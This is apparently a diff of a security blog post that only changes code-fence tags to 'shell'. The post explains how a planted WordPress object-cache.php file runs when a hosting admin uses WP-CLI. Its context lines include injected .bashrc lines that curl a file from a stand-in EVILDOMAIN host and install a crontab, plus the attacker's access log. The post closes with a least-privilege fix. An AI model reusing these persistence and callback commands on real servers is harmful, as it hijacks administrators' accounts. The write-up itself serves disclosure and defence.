@@ -5,7 +5,7 @@ WP-CLI [1] is the command-line interface for WordPress, as their site claims. It
 
 An example:
 
-``` 
+```shell
 $ wp-cli.phar core version 
 4.8.1
 $ wp-cli.phar plugin list
@@ -29,7 +29,7 @@ When you execute wp-cli.phar it executes WordPress to get access to the database
 Within the above example we do an integrity check of the WordPress core (the official files shipped with WordPress). We do this using the `wp-cli.phar checksum core` command. This makes checksums for the files in de installation directory and checks those to the checksums from the original files. If there is code added to files these checksums would not match. This is a good way to ensure nobody added code to the WordPress core files. 
 
 An example of using checksums of file content:
-```
+```shell
 $ cat testfile1 
 hi
 $ cat testfile2
@@ -78,7 +78,7 @@ Although this code is part of a plugin it is executed with every request to Word
 This could be a nice attack vector.
 
 So let's see this in action:
-```
+```shell
 $ stat wp-content/object-cache.php
 stat: cannot stat `wp-content/object-cache.php': No such file or directory
 $ wp-cli.phar plugin list --skip-themes --skip-plugins
@@ -188,7 +188,7 @@ Let's inject the following into `wp-content/object-cache.php` on this WordPress 
 
 After we injected this into the site we send hostingcompany X a ticket that we cannot update some of our plugins. Patrick gets our ticket assigned, logs into the server over SSH and runs `wp-cli.phar` to see what plugins have updates available. He adds the `--skip-themes` and `--skip-plugins` arguments to be on the safe side. This is what he would see:
 
-```
+```shell
 $ wp-cli.phar plugin list --skip-plugins --skip-themes
 +-------------------------------+----------+--------+---------+
 | name                          | status   | update | version |
@@ -202,7 +202,7 @@ $ wp-cli.phar plugin list --skip-plugins --skip-themes
 
 
 He sees nothing at all of importance. No hack, no out of date plugins. Nothing of importance. Meanwhile on EVILDOMAIN's webserver we see the following in the logs:
-```
+```shell
 root@EVILDOMAIN:/var/log/apache2/# tail -f access.log 
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:55] "GET /sshkey.pub HTTP/1.1" 200 -
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /sskey.pub HTTP/1.1" 200 -
@@ -212,7 +212,7 @@ xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?patrick@xxxx.xxxx.com HTTP/1.1" 
 
 
 On the hosting machine a quick look at Patricks `.bashrc`:
-```
+```shell
 $ tail -n 3 ~/.bashrc 
 curl -s http://EVILDOMAIN/sshkey.pub?patrick@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
 crontab /tmp/.cronfile 2>&1 > /dev/null;
@@ -223,7 +223,7 @@ crontab /tmp/.cronfile 2>&1 > /dev/null;
 If Patrick logs into the system once again he will execute lines in his bashrc before he sees a prompt. It adds the cronjob and the exploit is executed as the user Patrick. Maybe Patrick has passwordless sudo, maybe he doesn't. As it stands we now as an attacker have the same abilities as Patrick. This is a problem and not just Patrick's. We have an account on the system that can examine user databases, view configs and more.
 
 There are some rare cases where we don't need Patrick. Might be so that hostingcompany X implement automatic updates of WordPress for you with a cronjob. These cronjobs might even be running as root:
-```
+```shell
 * 0 * * * wp-cli.phar --allow-root core update && chown -R webuser:webuser httpdocs/
 ```
 This would give us code execution as root on the webserver, imagine the damage that we could do.
@@ -233,7 +233,7 @@ This would give us code execution as root on the webserver, imagine the damage t
 While this problem might be quite serious the problem lies not with WP-CLI or even WordPress. The problem is that the hostingcompany doesn't what code is executed when wp-cli.phar is used. Using WP-CLI makes life very easy for WordPress Hosters, but you need to understand what this application does under the hood. The solution to this issue is fairly easy. Always use the concept of least privilege. This means that to execute the code you use an account that has only the necessary privileges or power over the system that are needed to execute the code.
 
 In this example we could use the user account `webuser` for this. If you force the use of the non-privileged `webuse`r all problems will be contained to the rights this user has. This can be done with the `sudo` command. Yes, it has uses other than `sudo su` and `sudo make me a sandwich`:
-```
+```shell
 $ sudo -u webuser wp-cli.phar plugin list
 ```
 
